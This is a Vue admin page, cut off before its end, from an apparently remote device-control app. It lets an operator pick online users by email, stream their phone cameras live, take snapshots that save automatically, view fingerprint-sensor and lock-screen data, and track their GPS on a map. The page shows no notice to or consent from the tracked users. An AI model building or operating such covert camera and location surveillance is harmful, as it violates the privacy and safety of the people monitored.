<template>
  <AppLayout>
    <div class="device-control">
      <h2 class="page-title">设备控制</h2>

      <!-- 连接状态 -->
      <el-card shadow="hover" class="status-card">
        <template #header>
          <div class="card-header">
            <span>连接状态</span>
            <el-tag v-if="wsConnected" type="success" size="small">已连接</el-tag>
            <el-tag v-else-if="reconnecting" type="warning" size="small">重连中...</el-tag>
            <el-tag v-else type="info" size="small">未连接</el-tag>
          </div>
        </template>
        <el-row :gutter="16" align="middle">
          <el-col :span="16">
            <span v-if="connectionStore.mode !== 'remote'" style="color: #909399">
              设备控制仅支持远程模式（需连接到服务器）
            </span>
            <span v-else-if="!wsConnected && !reconnecting" style="color: #E6A23C">
              WebSocket未连接，请点击连接
            </span>
            <span v-else-if="reconnecting" style="color: #E6A23C">
              连接断开，正在自动重连（第{{ reconnectAttempts }}次）...
            </span>
            <span v-else style="color: #67C23A">
              WebSocket已连接，可选择用户进行设备控制
            </span>
          </el-col>
          <el-col :span="8" style="text-align: right">
            <el-button
              v-if="!wsConnected && !reconnecting"
              type="primary"
              @click="connectWs"
              :disabled="connectionStore.mode !== 'remote'"
              :loading="connecting"
            >
              连接WebSocket
            </el-button>
            <el-button v-if="reconnecting" @click="cancelReconnect">
              取消重连
            </el-button>
            <el-button v-if="wsConnected" type="danger" @click="disconnectWs">
              断开连接
            </el-button>
          </el-col>
        </el-row>
      </el-card>

      <!-- v1.52.5+ 多标签页切换 -->
      <el-tabs v-model="activeTab" v-if="wsConnected" type="border-card" class="control-tabs">
        <!-- 标签页1：设备控制（摄像头/抓拍/指纹等） -->
        <el-tab-pane label="设备控制" name="control">
          <!-- 用户选择 -->
          <el-card shadow="hover" class="user-card">
            <template #header>
              <div class="card-header">
                <span>在线用户</span>
                <el-button text type="primary" size="small" @click="loadOnlineUsers" :loading="loadingUsers">
                  刷新
                </el-button>
              </div>
            </template>

            <el-table :data="onlineUsers" stripe style="width: 100%" v-loading="loadingUsers"
              @row-click="handleUserClick" highlight-current-row
              :row-class-name="({ row }) => row.id === selectedUserId ? 'selected-row' : ''"
            >
              <el-table-column prop="id" label="ID" width="80" />
              <el-table-column prop="email" label="邮箱" />
              <el-table-column label="状态" width="100">
                <template #default="{ row }">
                  <el-tag :type="row.isOnline ? 'success' : 'info'" size="small">
                    {{ row.isOnline ? '在线' : '离线' }}
                  </el-tag>
                </template>
              </el-table-column>
              <el-table-column label="操作" width="280">
                <template #default="{ row }">
                  <el-button-group>
                    <el-button
                      v-if="row.isOnline && streamingUserId !== row.id"
                      type="primary"
                      size="small"
                      @click.stop="requestCamera(row)"
                    >
                      实时显示
                    </el-button>
                    <el-button
                      v-if="streamingUserId === row.id"
                      type="danger"
                      size="small"
                      @click.stop="stopCamera"
                    >
                      停止推流
                    </el-button>
                    <el-button
                      v-if="row.isOnline"
                      type="warning"
                      size="small"
                      @click.stop="requestSnapshot(row)"
                      :loading="snapshotLoading && snapshotUserId === row.id"
                    >
                      抓拍测试
                    </el-button>
                  </el-button-group>
                </template>
              </el-table-column>
            </el-table>
          </el-card>

          <!-- 摄像头画面 -->
          <el-card shadow="hover" class="video-card">
            <template #header>
              <div class="card-header">
                <span>摄像头画面</span>
                <div class="camera-controls">
                  <el-radio-group v-model="cameraMode" size="small" @change="onCameraModeChange">
                    <el-radio-button value="front">前置</el-radio-button>
                    <el-radio-button value="rear">后置</el-radio-button>
                    <el-radio-button value="dual">双摄</el-radio-button>
                  </el-radio-group>
                  <el-tag v-if="streamStatus === 'streaming'" type="success" size="small" style="margin-left:8px">推流中</el-tag>
                  <el-tag v-else-if="streamStatus === 'requesting'" type="warning" size="small" style="margin-left:8px">请求中</el-tag>
                  <el-tag v-else-if="streamStatus === 'waiting'" type="info" size="small" style="margin-left:8px">等待App连接</el-tag>
                  <el-tag v-else-if="streamStatus === 'snapshot_requesting'" type="warning" size="small" style="margin-left:8px">抓拍请求中</el-tag>
                  <el-tag v-else type="info" size="small" style="margin-left:8px">未启动</el-tag>
                </div>
              </div>
            </template>
            <div class="video-container" :class="{ 'dual-mode': cameraMode === 'dual' && streamStatus === 'streaming' }">
              <!-- 前置摄像头画面 -->
              <div class="video-panel" v-if="cameraMode === 'front' || cameraMode === 'dual'">
                <div v-if="cameraMode === 'dual'" class="video-label">前置摄像头</div>
                <canvas ref="frontCanvasRef" class="video-canvas" v-show="streamStatus === 'streaming' && frontStreamActive"></canvas>
              </div>
              <!-- 后置摄像头画面 -->
              <div class="video-panel" v-if="cameraMode === 'rear' || cameraMode === 'dual'">
                <div v-if="cameraMode === 'dual'" class="video-label">后置摄像头</div>
                <canvas ref="rearCanvasRef" class="video-canvas" v-show="streamStatus === 'streaming' && rearStreamActive"></canvas>
              </div>
              <!-- 抓拍照片 -->
              <div class="snapshot-panel" v-if="snapshotImages.length > 0">
                <div v-for="(snap, idx) in snapshotImages" :key="idx" class="snapshot-item">
                  <div class="video-label">{{ snap.source === 'front' ? '前置' : '后置' }}抓拍</div>
                  <img :src="snap.dataUrl" class="snapshot-image" />
                </div>
              </div>
              <!-- 占位提示 + 请求进度 -->
              <div v-if="streamStatus !== 'streaming' && snapshotImages.length === 0" class="video-placeholder">
                <template v-if="streamStatus === 'requesting'">
                  <div class="requesting-info">
                    <el-icon class="is-loading" :size="32"><Loading /></el-icon>
                    <p class="requesting-title">正在请求App端摄像头</p>
                    <el-progress :percentage="requestProgress" :format="() => requestProgressText" :stroke-width="14" style="width: 80%; max-width: 400px; margin-top: 12px;" />
                    <div class="requesting-stats">
                      <span>已等待: {{ requestElapsedText }}</span>
                      <span v-if="transferSpeed > 0">接收速度: {{ transferSpeedText }}</span>
                    </div>
                  </div>
                </template>
                <p v-else-if="streamStatus === 'waiting'">等待App端上线连接...</p>
                <template v-else-if="streamStatus === 'snapshot_requesting'">
                  <div class="requesting-info">
                    <el-icon class="is-loading" :size="32"><Loading /></el-icon>
                    <p class="requesting-title">正在抓拍中，请稍候</p>
                  </div>
                </template>
                <p v-else>选择在线用户，使用"实时显示"或"抓拍测试"</p>
              </div>
            </div>
            <!-- 传输速度和帧率信息栏 -->
            <div class="stream-stats" v-if="streamStatus === 'streaming' || snapshotLoading">
              <div class="stat-item">
                <span class="stat-label">传输速度:</span>
                <span class="stat-value">{{ transferSpeedText }}</span>
              </div>
              <div class="stat-item" v-if="streamStatus === 'streaming'">
                <span class="stat-label">帧率:</span>
                <span class="stat-value">{{ frameRateText }}</span>
              </div>
              <div class="stat-item">
                <span class="stat-label">已接收:</span>
                <span class="stat-value">{{ totalReceivedText }}</span>
              </div>
            </div>
            <!-- 抓拍进度条 -->
            <div class="snapshot-progress" v-if="snapshotLoading">
              <el-progress :percentage="snapshotProgress" :format="() => snapshotProgressText" :stroke-width="18" />
            </div>
            <!-- 抓拍照片操作栏 -->
            <div v-if="snapshotImages.length > 0" class="snapshot-actions">
              <el-button type="primary" size="small" @click="downloadAllSnapshots">保存全部</el-button>
              <el-button size="small" @click="snapshotImages = []">关闭</el-button>
            </div>
          </el-card>

          <!-- 抓拍保存设置 -->
          <el-card shadow="hover" class="save-card">
            <template #header>
              <div class="card-header">
                <span>抓拍保存设置</span>
              </div>
            </template>
            <el-row :gutter="16" align="middle">
              <el-col :span="18">
                <el-input v-model="snapshotSaveDir" placeholder="选择抓拍照片保存路径" readonly>
                  <template #prepend>保存路径</template>
                </el-input>
              </el-col>
              <el-col :span="6" style="text-align: right">
                <el-button @click="selectSaveDir">选择文件夹</el-button>
              </el-col>
            </el-row>
            <div v-if="snapshotSaveDir" style="margin-top: 8px; color: #67C23A; font-size: 12px">
              抓拍照片将自动保存到: {{ snapshotSaveDir }}
            </div>
          </el-card>

          <!-- 编解码器信息 -->
          <el-card shadow="hover" class="info-card" v-if="selectedUserId && codecInfo">
            <template #header>
              <div class="card-header">
                <span>编解码器检测信息</span>
                <el-tag v-if="codecInfo.supports_hardware_encoding" type="success" size="small">支持硬件编码</el-tag>
                <el-tag v-else type="warning" size="small">仅软件编码</el-tag>
              </div>
            </template>
            <el-descriptions :column="2" border size="small">
              <el-descriptions-item label="硬件编码">{{ codecInfo.supports_hardware_encoding ? '支持' : '不支持' }}</el-descriptions-item>
              <el-descriptions-item label="超快速编码">{{ codecInfo.supports_ultrafast ? '支持' : '不支持' }}</el-descriptions-item>
              <el-descriptions-item label="CPU硬件名称">{{ codecInfo.cpu_hardware_name || '未知' }}</el-descriptions-item>
              <el-descriptions-item label="CPU核心数">{{ codecInfo.cpu_cores || '未知' }}</el-descriptions-item>
              <el-descriptions-item label="最大频率">{{ codecInfo.cpu_max_freq_mhz ? codecInfo.cpu_max_freq_mhz + ' MHz' : '未知' }}</el-descriptions-item>
              <el-descriptions-item label="App版本">{{ codecInfo.app_version || '未知' }}</el-descriptions-item>
              <el-descriptions-item label="检测时间" :span="2">{{ codecInfo.detected_at || '未知' }}</el-descriptions-item>
            </el-descriptions>
          </el-card>

          <!-- 指纹检测信息 -->
          <el-card shadow="hover" class="info-card" v-if="selectedUserId && fingerprintData">
            <template #header>
              <div class="card-header">
                <span>指纹检测数据</span>
                <div>
                  <el-tag v-if="fingerprintData.has_fingerprint_hardware" type="success" size="small" style="margin-right:4px">有硬件</el-tag>
                  <el-tag v-if="fingerprintData.has_enrolled_fingerprints" type="warning" size="small">已注册</el-tag>
                </div>
              </div>
            </template>
            <el-descriptions :column="2" border size="small">
              <el-descriptions-item label="指纹硬件">{{ fingerprintData.has_fingerprint_hardware ? '支持' : '不支持' }}</el-descriptions-item>
              <el-descriptions-item label="已注册指纹">{{ fingerprintData.has_enrolled_fingerprints ? '是' : '否' }}</el-descriptions-item>
              <el-descriptions-item label="传感器类型">{{ fingerprintData.sensor_type || '未知' }}</el-descriptions-item>
              <el-descriptions-item label="注册数量">{{ fingerprintData.enrolled_count ?? '未知' }}</el-descriptions-item>
              <el-descriptions-item label="设备型号">{{ fingerprintData.model || '未知' }}</el-descriptions-item>
              <el-descriptions-item label="品牌">{{ fingerprintData.brand || '未知' }}</el-descriptions-item>
              <el-descriptions-item label="SDK版本">{{ fingerprintData.sdk_version || '未知' }}</el-descriptions-item>
              <el-descriptions-item label="系统版本">{{ fingerprintData.os_version || '未知' }}</el-descriptions-item>
              <el-descriptions-item label="验证尝试次数">{{ fingerprintData.verify_attempt_count ?? 0 }}</el-descriptions-item>
              <el-descriptions-item label="验证成功次数">{{ fingerprintData.verify_success_count ?? 0 }}</el-descriptions-item>
              <el-descriptions-item label="验证失败次数">{{ fingerprintData.verify_failure_count ?? 0 }}</el-descriptions-item>
              <el-descriptions-item label="安全锁屏">{{ fingerprintData.is_keyguard_secure ? '已设置' : '未设置' }}</el-descriptions-item>
              <el-descriptions-item label="同步时间" :span="2">{{ fingerprintData.synced_at || '未知' }}</el-descriptions-item>
            </el-descriptions>
          </el-card>
        </el-tab-pane>

        <!-- v1.52.5+ 标签页2：GPS定位追踪 -->
        <el-tab-pane label="GPS定位追踪" name="gps">
          <!-- GPS用户选择 -->
          <el-card shadow="hover" class="user-card">
            <template #header>
              <div class="card-header">
                <span>在线用户</span>
                <el-button text type="primary" size="small" @click="loadOnlineUsers" :loading="loadingUsers">
                  刷新
                </el-button>
              </div>
            </template>

            <el-table :data="onlineUsers" stripe style="width: 100%" v-loading="loadingUsers"
              highlight-current-row
              :row-class-name="({ row }) => row.id === gpsTrackingUserId ? 'selected-row' : ''"
            >
              <el-table-column prop="id" label="ID" width="80" />
              <el-table-column prop="email" label="邮箱" />
              <el-table-column label="状态" width="100">
                <template #default="{ row }">
                  <el-tag :type="row.isOnline ? 'success' : 'info'" size="small">
                    {{ row.isOnline ? '在线' : '离线' }}
                  </el-tag>
                </template>
              </el-table-column>
              <el-table-column label="GPS" width="120">
                <template #default="{ row }">
                  <el-tag v-if="gpsDataMap[row.id]" type="success" size="small">
                    {{ formatCoordTime(gpsDataMap[row.id].timestamp) }}
                  </el-tag>
                  <el-tag v-else type="info" size="small">无数据</el-tag>
                </template>
              </el-table-column>
              <el-table-column label="操作" width="200">
                <template #default="{ row }">
                  <el-button
                    v-if="row.isOnline && gpsTrackingUserId !== row.id"
                    type="primary"
                    size="small"
                    @click="startGpsTracking(row)"
                  >
                    开始追踪
                  </el-button>
                  <el-button
                    v-if="gpsTrackingUserId === row.id"
                    type="danger"
                    size="small"
                    @click="stopGpsTracking"
                  >
                    停止追踪
                  </el-button>
                </template>
              </el-table-column>
            </el-table>
          </el-card>

          <!-- GPS坐标信息面板 -->
          <el-card shadow="hover" class="gps-info-card" v-if="gpsTrackingUserId && currentGpsData">
            <template #header>
              <div class="card-header">
                <span>GPS实时坐标</span>
                <el-tag type="success" size="small">追踪中</el-tag>
              </div>
            </template>
            <el-row :gutter="16">
              <el-col :span="12">
                <el-descriptions :column="1" border size="small">
                  <el-descriptions-item label="目标用户ID">{{ gpsTrackingUserId }}</el-descriptions-item>
                  <el-descriptions-item label="纬度 (Lat)">
                    <span style="font-family: monospace; font-weight: bold;">{{ currentGpsData.latitude?.toFixed(6) }}</span>
                  </el-descriptions-item>
                  <el-descriptions-item label="经度 (Lng)">
                    <span style="font-family: monospace; font-weight: bold;">{{ currentGpsData.longitude?.toFixed(6) }}</span>
                  </el-descriptions-item>
                  <el-descriptions-item label="更新间隔">{{ gpsUpdateInterval }}秒</el-descriptions-item>
                </el-descriptions>
              </el-col>
              <el-col :span="12">
                <el-descriptions :column="1" border size="small">
                  <el-descriptions-item label="定位精度">{{ (currentGpsData.accuracy || 0).toFixed(1) }} m</el-descriptions-item>
                  <el-descriptions-item label="海拔高度">{{ (currentGpsData.altitude || 0).toFixed(1) }} m</el-descriptions-item>
                  <el-descriptions-item label="移动速度">{{ ((currentGpsData.speed || 0) * 3.6).toFixed(1) }} km/h</el-descriptions-item>
                  <el-descriptions-item label="方向角度">{{ (currentGpsData.heading || 0).toFixed(1) }}°</el-descriptions-item>
                </el-descriptions>
              </el-col>
            </el-row>
          </el-card>

          <!-- 内置Leaflet地图 -->
          <el-card shadow="hover" class="map-card" v-if="gpsTrackingUserId">
            <template #header>
              <div class="card-header">
                <span>GPS实时地图</span>
                <span style="font-size: 12px; color: #909399;">
                  OpenStreetMap | 追踪点: {{ trackPoints.length }}
                </span>
              </div>
            </template>
            <div ref="mapContainer" class="map-container"></div>
          </el-card>

          <!-- 未追踪提示 -->
          <el-card shadow="hover" v-if="!gpsTrackingUserId">
            <div class="no-track-placeholder">
              <el-icon :size="48" color="#c0c4cc"><MapLocation /></el-icon>
              <p style="margin-top: 12px; color: #909399;">选择一个在线用户，点击"开始追踪"以查看其GPS实时定位</p>
            </div>
          </el-card>
        </el-tab-pane>
      </el-tabs>

      <!-- 未连接时的提示 -->
      <el-card shadow="hover" v-if="!wsConnected && !reconnecting" style="text-align: center; padding: 40px;">
        <el-icon :size="48" color="#c0c4cc"><Connection /></el-icon>
        <p style="margin-top: 12px; color: #909399;">请先连接WebSocket以使用设备控制功能</p>
      </el-card>
    </div>
  </AppLayout>
</template>

<script setup>
import { ref, onBeforeUnmount, nextTick, watch } from 'vue'
import { ElMessage } from 'element-plus'
import { Loading, Connection, MapLocation } from '@element-plus/icons-vue'
import AppLayout from '@/components/AppLayout.vue'
import { useConnectionStore } from '@/stores/connection'
import { api } from '@/utils/api'

const connectionStore = useConnectionStore()

// ============================================================
// 多标签页
// ============================================================
const activeTab = ref('control')

// ============================================================
// WebSocket连接
// ============================================================
let ws = null

const wsConnected = ref(false)
const connecting = ref(false)

// 自动重连
const reconnecting = ref(false)
const reconnectAttempts = ref(0)
let reconnectTimer = null
let intentionalDisconnect = false

// ============================================================
// 用户列表（共用）
// ============================================================
const onlineUsers = ref([])
const loadingUsers = ref(false)
const selectedUserId = ref(null)

// ============================================================
// 摄像头推流状态
// ============================================================
const streamingUserId = ref(null)
const streamStatus = ref('idle')

const cameraMode = ref('front')
const frontStreamActive = ref(false)
const rearStreamActive = ref(false)

// 抓拍状态
const snapshotLoading = ref(false)
const snapshotUserId = ref(null)
const snapshotImages = ref([])
const snapshotSaveDir = ref(localStorage.getItem('snapshotSaveDir') || '')

// 编解码器和指纹数据
const codecInfo = ref(null)
const fingerprintData = ref(null)

// ---- 传输速度统计 ----
let bytesReceived = 0
let lastSpeedBytes = 0
let lastSpeedTime = 0
const transferSpeed = ref(0)
let frameCount = 0
let lastFrameCountTime = 0
let lastFrameCount = 0
const frameRate = ref(0)
let speedCalcTimer = null

const snapshotProgress = ref(0)
const snapshotProgressText = ref('请求中...')

const requestProgress = ref(0)
const requestProgressText = ref('发送请求...')
const requestElapsedText = ref('0s')
let requestStartTime = 0
let requestProgressTimer = null

const frontCanvasRef = ref(null)
const rearCanvasRef = ref(null)

const transferSpeedText = ref('0 B/s')
const frameRateText = ref('0 fps')
const totalReceivedText = ref('0 B')

// ============================================================
// v1.52.5+ GPS追踪状态
// ============================================================
const gpsTrackingUserId = ref(null)
const currentGpsData = ref(null)
const gpsDataMap = ref({})  // userId -> gpsData
const trackPoints = ref([]) // 轨迹点数组 [{lat, lng}]
const gpsUpdateInterval = ref(3) // GPS更新间隔（秒）
let leafletMap = null
let leafletMarker = null
let leafletTrackLine = null
const mapContainer = ref(null)

// 格式化GPS时间
function formatCoordTime(timestamp) {
  if (!timestamp) return '--'
  const date = new Date(timestamp)
  return date.toLocaleTimeString('zh-CN', { hour: '2-digit', minute: '2-digit', second: '2-digit' })
}

// 初始化Leaflet地图
function initMap() {
  if (!mapContainer.value) return

  if (leafletMap) {
    leafletMap.invalidateSize()
    return
  }

  leafletMap = L.map(mapContainer.value, {
    center: [39.90923, 116.39747],  // 默认中心：北京
    zoom: 15,
    zoomControl: true,
  })

  // v1.52.7+ 高德地图瓦片图层（国内网络友好，无需API Key）
  L.tileLayer('https://webrd0{s}.is.autonavi.com/appmaptile?lang=zh_cn&size=1&scale=1&style=8&x={x}&y={y}&z={z}', {
    subdomains: ['1', '2', '3', '4'],
    maxZoom: 18,
  }).addTo(leafletMap)
}

// 初始化GPS标记
function initGpsMarker() {
  if (!leafletMap) return

  // 清除旧标记
  if (leafletMarker) {
    leafletMap.removeLayer(leafletMarker)
  }
  if (leafletTrackLine) {
    leafletMap.removeLayer(leafletTrackLine)
  }

  // GPS位置图标（自定义CSS圆形标记）
  const gpsIcon = L.divIcon({
    className: 'gps-marker-icon',
    html: '<div class="gps-marker-pulse"></div><div class="gps-marker-dot"></div>',
    iconSize: [20, 20],
    iconAnchor: [10, 10],
  })

  leafletMarker = L.marker([0, 0], { icon: gpsIcon }).addTo(leafletMap)

  // 轨迹线
  if (trackPoints.value.length >= 2) {
    leafletTrackLine = L.polyline(trackPoints.value, {
      color: '#409eff',
      weight: 3,
      opacity: 0.7,
    }).addTo(leafletMap)
  }
}

// 更新地图上的GPS位置
function updateMapPosition(lat, lng) {
  if (!leafletMap) {
    initMap()
  }
  if (!leafletMarker) {
    initGpsMarker()
  }

  if (leafletMarker) {
    leafletMarker.setLatLng([lat, lng])
    leafletMap.setView([lat, lng], leafletMap.getZoom(), { animate: true })
  }

  // 添加轨迹点
  trackPoints.value.push([lat, lng])
  if (trackPoints.value.length > 200) {
    trackPoints.value.shift()
  }

  // 更新轨迹线
  if (leafletTrackLine) {
    leafletMap.removeLayer(leafletTrackLine)
  }
  if (trackPoints.value.length >= 2) {
    leafletTrackLine = L.polyline(trackPoints.value, {
      color: '#409eff',
      weight: 3,
      opacity: 0.7,
    }).addTo(leafletMap)
  }
}

// 监听标签页切换，切换到GPS标签时初始化地图
watch(activeTab, (newTab) => {
  if (newTab === 'gps') {
    nextTick(() => {
      setTimeout(() => {
        initMap()
        // 如果有当前位置，更新地图
        if (currentGpsData.value) {
          updateMapPosition(currentGpsData.value.latitude, currentGpsData.value.longitude)
        }
      }, 300)
    })
  }
})

// 开始GPS追踪
function startGpsTracking(user) {
  if (!wsConnected.value) return

  gpsTrackingUserId.value = user.id
  trackPoints.value = []
  currentGpsData.value = null

  // 发送GPS开始请求
  sendMessage('admin_request_gps_start', { userId: user.id })
  ElMessage.success(`已请求用户 ${user.email} 的GPS定位数据`)

  // 初始化地图
  nextTick(() => {
    setTimeout(() => {
      initMap()
      initGpsMarker()
    }, 500)
  })
}

// 停止GPS追踪
function stopGpsTracking() {
  if (gpsTrackingUserId.value) {
    sendMessage('admin_request_gps_stop', { userId: gpsTrackingUserId.value })
  }

  gpsTrackingUserId.value = null
  currentGpsData.value = null
  trackPoints.value = []

  // 清除地图标记
  if (leafletMarker && leafletMap) {
    leafletMap.removeLayer(leafletMarker)
    leafletMarker = null
  }
  if (leafletTrackLine && leafletMap) {
    leafletMap.removeLayer(leafletTrackLine)
    leafletTrackLine = null
  }

  ElMessage.info('已停止GPS追踪')
}

// ============================================================
// 格式化工具函数
// ============================================================
function formatBytes(bytes) {
  if (bytes < 1024) return bytes.toFixed(0) + ' B'
  if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB'
  if (bytes < 1024 * 1024 * 1024) return (bytes / (1024 * 1024)).toFixed(2) + ' MB'
  return (bytes / (1024 * 1024 * 1024)).toFixed(2) + ' GB'
}

function updateSpeedDisplay() {
  transferSpeedText.value = formatBytes(transferSpeed.value) + '/s'
  totalReceivedText.value = formatBytes(bytesReceived)
  frameRateText.value = frameRate.value.toFixed(1) + ' fps'
}

// ============================================================
// 速度计算定时器
// ============================================================
function startSpeedCalc() {
  stopSpeedCalc()
  lastSpeedTime = Date.now()
  lastSpeedBytes = 0
  lastFrameCountTime = Date.now()
  lastFrameCount = 0
  frameCount = 0
  bytesReceived = 0
  speedCalcTimer = setInterval(() => {
    const now = Date.now()
    const elapsed = (now - lastSpeedTime) / 1000
    if (elapsed > 0) {
      transferSpeed.value = (bytesReceived - lastSpeedBytes) / elapsed
      lastSpeedBytes = bytesReceived
      lastSpeedTime = now
    }
    const frameElapsed = (now - lastFrameCountTime) / 1000
    if (frameElapsed > 0) {
      frameRate.value = (frameCount - lastFrameCount) / frameElapsed
      lastFrameCount = frameCount
      lastFrameCountTime = now
    }
    updateSpeedDisplay()
  }, 1000)
}

function stopSpeedCalc() {
  if (speedCalcTimer) {
    clearInterval(speedCalcTimer)
    speedCalcTimer = null
  }
  transferSpeed.value = 0
  frameRate.value = 0
  updateSpeedDisplay()
}

// ============================================================
// 请求推流进度
// ============================================================
function startRequestProgress() {
  stopRequestProgress()
  requestStartTime = Date.now()
  requestProgress.value = 5
  requestProgressText.value = '发送请求...'
  requestElapsedText.value = '0s'

  requestProgressTimer = setInterval(() => {
    const elapsed = Math.round((Date.now() - requestStartTime) / 1000)
    requestElapsedText.value = elapsed + 's'

    if (elapsed < 1) {
      requestProgress.value = 10
      requestProgressText.value = '请求已发送，等待App端响应...'
    } else if (elapsed < 3) {
      requestProgress.value = 25
      requestProgressText.value = 'App端正在接收请求...'
    } else if (elapsed < 5) {
      requestProgress.value = 40
      requestProgressText.value = 'App端正在打开摄像头...'
    } else if (elapsed < 8) {
      requestProgress.value = 55
      requestProgressText.value = 'App端正在初始化摄像头...'
    } else if (elapsed < 12) {
      requestProgress.value = 70
      requestProgressText.value = '摄像头已就绪，等待首帧数据...'
    } else if (elapsed < 20) {
      requestProgress.value = 85
      requestProgressText.value = '正在接收画面数据...'
    } else {
      requestProgress.value = 90
      requestProgressText.value = '等待时间较长，请检查App端网络...'
    }
  }, 500)
}

function stopRequestProgress() {
  if (requestProgressTimer) {
    clearInterval(requestProgressTimer)
    requestProgressTimer = null
  }
  requestProgress.value = 0
}

// ============================================================
// 摄像头操作
// ============================================================
function onCameraModeChange(mode) {
  if (streamingUserId.value && streamStatus.value === 'streaming') {
    requestCamera({ id: streamingUserId.value, email: '' })
  }
}

async function selectSaveDir() {
  try {
    const dir = await api.selectFolder()
    if (dir) {
      snapshotSaveDir.value = dir
      localStorage.setItem('snapshotSaveDir', dir)
      ElMessage.success('保存路径已设置')
    }
  } catch (err) {
    ElMessage.error('选择文件夹失败: ' + err.message)
  }
}

async function saveSnapshotToLocal(base64Data, source) {
  if (!snapshotSaveDir.value) return
  try {
    const now = new Date()
    const filename = `snapshot_${source}_${now.getTime()}.jpg`
    // 通过Electron预加载API保存
    if (window.electronAPI?.saveBase64File) {
      const result = await window.electronAPI.saveBase64File(snapshotSaveDir.value, filename, base64Data)
      if (result?.success) {
        ElMessage.success(`抓拍已自动保存: ${filename}`)
      }
    }
  } catch (err) {
    console.error('保存抓拍失败:', err)
  }
}

async function downloadAllSnapshots() {
  ElMessage.info('抓拍照片已显示，请右键保存')
}

function handleUserClick(row) {
  selectedUserId.value = row.id
}

function requestCamera(row) {
  if (!wsConnected.value) return
  streamingUserId.value = row.id
  selectedUserId.value = row.id
  snapshotImages.value = []
  streamStatus.value = 'requesting'
  frontStreamActive.value = false
  rearStreamActive.value = false
  sendMessage('admin_camera_request', { userId: row.id, cameraMode: cameraMode.value })
  startRequestProgress()
}

function stopCamera() {
  if (!wsConnected.value) return
  sendMessage('admin_camera_stop', { userId: streamingUserId.value })
  stopRequestProgress()
  streamingUserId.value = null
  streamStatus.value = 'idle'
  frontStreamActive.value = false
  rearStreamActive.value = false
  stopSpeedCalc()
}

function requestSnapshot(row) {
  if (!wsConnected.value) return
  snapshotLoading.value = true
  snapshotUserId.value = row.id
  snapshotProgress.value = 10
  snapshotProgressText.value = '准备抓拍...'
  startSpeedCalc()
  sendMessage('admin_camera_snapshot', { userId: row.id, cameraMode: cameraMode.value })
}

// ============================================================
// WebSocket连接
// ============================================================
async function connectWs() {
  if (connecting.value) return
  connecting.value = true
  intentionalDisconnect = false

  try {
    // v1.52.5+ 通过API获取管理员WebSocket临时Token（而非从localStorage读取）
    const tokenResult = await api.getAdminWsToken()
    if (!tokenResult || !tokenResult.token) {
      ElMessage.error('获取WebSocket Token失败: ' + (tokenResult?.error || '请先连接远程服务器'))
      connecting.value = false
      return
    }
    const token = tokenResult.token

    const serverUrl = connectionStore.serverUrl || 'http://localhost:3000'
    const parsedUrl = new URL(serverUrl)
    const wsScheme = parsedUrl.protocol === 'https:' ? 'wss' : 'ws'
    const wsUrl = `${wsScheme}://${parsedUrl.host}/ws?token=${token}`

    ws = new WebSocket(wsUrl)

    ws.onopen = () => {
      wsConnected.value = true
      connecting.value = false
      reconnecting.value = false
      reconnectAttempts.value = 0
      ElMessage.success('WebSocket连接成功')
      loadOnlineUsers()
    }

    ws.onmessage = (event) => {
      try {
        const msg = JSON.parse(event.data)
        handleWsMessage(msg)
      } catch (err) {
        console.error('消息解析失败:', err)
      }
    }

    ws.onerror = () => {
      console.error('WebSocket错误')
    }

    ws.onclose = () => {
      wsConnected.value = false
      connecting.value = false
      ws = null
      if (!intentionalDisconnect) {
        scheduleReconnect()
      }
    }
  } catch (err) {
    connecting.value = false
    ElMessage.error('连接失败: ' + err.message)
  }
}

function disconnectWs() {
  intentionalDisconnect = true
  if (reconnectTimer) {
    clearTimeout(reconnectTimer)
    reconnectTimer = null
  }
  if (ws) {
    ws.close()
    ws = null
  }
  wsConnected.value = false
  reconnecting.value = false

  // 清理GPS状态
  if (gpsTrackingUserId.value) {
    gpsTrackingUserId.value = null
    currentGpsData.value = null
    trackPoints.value = []
  }
  if (leafletMap) {
    leafletMap.remove()
    leafletMap = null
    leafletMarker = null
    leafletTrackLine = null
  }

  ElMessage.info('已断开WebSocket连接')
}

function cancelReconnect() {
  intentionalDisconnect = true
  reconnecting.value = false
  reconnectAttempts.value = 0
  if (reconnectTimer) {
    clearTimeout(reconnectTimer)
    reconnectTimer = null
  }
  ElMessage.info('已取消自动重连')
}

function scheduleReconnect() {
  reconnectAttempts.value++
  reconnecting.value = true
  const delay = Math.min(5000 * Math.pow(2, reconnectAttempts.value - 1), 60000)
  reconnectTimer = setTimeout(() => {
    if (!intentionalDisconnect) {
      connectWs()
    }
  }, delay)
}

function sendMessage(type, data = {}) {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ type, data }))
  }
}

async function loadOnlineUsers() {
  if (!wsConnected.value) return
  loadingUsers.value = true
  sendMessage('admin_get_online_users', {})
}

// ============================================================
// WebSocket消息处理
// ============================================================
function handleWsMessage(msg) {
  const { type, data } = msg

  switch (type) {
    // ---- 摄像头相关 ----
    case 'camera_status':
      handleCameraStatus(data)
      break
    case 'camera_frame':
      renderFrame(data)
      break
    case 'camera_snapshot':
      handleSnapshotResult(data)
      break
    case 'camera_error':
      ElMessage.error('摄像头错误: ' + (data?.message || '未知错误'))
      if (streamStatus.value !== 'streaming') {
        streamingUserId.value = null
        streamStatus.value = 'idle'
      }
      snapshotLoading.value = false
      snapshotUserId.value = null
      snapshotProgress.value = 0
      break

    // ---- 在线用户 ----
    case 'online_users':
      handleOnlineUsers(data)
      break
    case 'user_online':
      handleUserOnline(data)
      break
    case 'user_offline':
      handleUserOffline(data)
      break

    // ---- v1.52.5+ GPS追踪 ----
    case 'gps_position':
      handleGpsPosition(data)
      break
    case 'gps_error':
      ElMessage.error('GPS错误: ' + (data?.message || '未知错误'))
      break

    // ---- 心跳 ----
    case 'heartbeat':
      break
  }
}

function handleCameraStatus(data) {
  streamStatus.value = data.status
  if (data.status === 'streaming') {
    stopRequestProgress()
    ElMessage.success('摄像头推流已开始')
    startSpeedCalc()
  } else if (data.status === 'stopped') {
    stopRequestProgress()
    streamingUserId.value = null
    streamStatus.value = 'idle'
    frontStreamActive.value = false
    rearStreamActive.value = false
    stopSpeedCalc()
    ElMessage.info('摄像头推流已停止')
  } else if (data.status === 'waiting') {
    stopRequestProgress()
    ElMessage.warning('App端不在线，等待连接...')
  }
}

function handleSnapshotResult(data) {
  snapshotLoading.value = false
  snapshotUserId.value = null

  if (streamStatus.value !== 'streaming') {
    stopSpeedCalc()
  }

  if (data.image && data.format === 'jpeg') {
    const source = data.source || 'front'
